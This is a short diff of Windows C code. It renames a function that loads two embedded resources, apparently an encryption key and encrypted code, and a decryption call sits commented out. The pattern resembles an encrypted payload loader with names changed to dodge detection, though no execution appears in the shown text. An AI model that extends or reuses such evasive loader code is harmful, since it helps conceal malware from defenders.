@@ -5,9 +5,9 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void thisistheloadresou(const char* resName, char** data, DWORD* size) {
+void ooooloadrekusigma(const char* resourname, char** data, DWORD* size) {
     HMODULE hModule = GetModuleHandle(NULL);
-    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
+    HRSRC hResource = FindResource(hModule, resourname, RT_RCDATA);
     
     HGLOBAL hResData = LoadResource(hModule, hResource);
     *size = SizeofResource(hModule, hResource);
@@ -25,11 +25,11 @@ int main() {
 
     char* dank1e6ENC;
     DWORD dank1e6ENCLen;
-    thisistheloadresou("dhanushkey1", &dank1e6ENC, &dank1e6ENCLen);
+    ooooloadrekusigma("dhanushkey1", &dank1e6ENC, &dank1e6ENCLen);
 
     char* codfhu;
     DWORD codfhuLen;
-    thisistheloadresou("dhanushcode56", &codfhu, &codfhuLen);
+    ooooloadrekusigma("dhanushcode56", &codfhu, &codfhuLen);
 
     //youareawsomeenc(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);
 
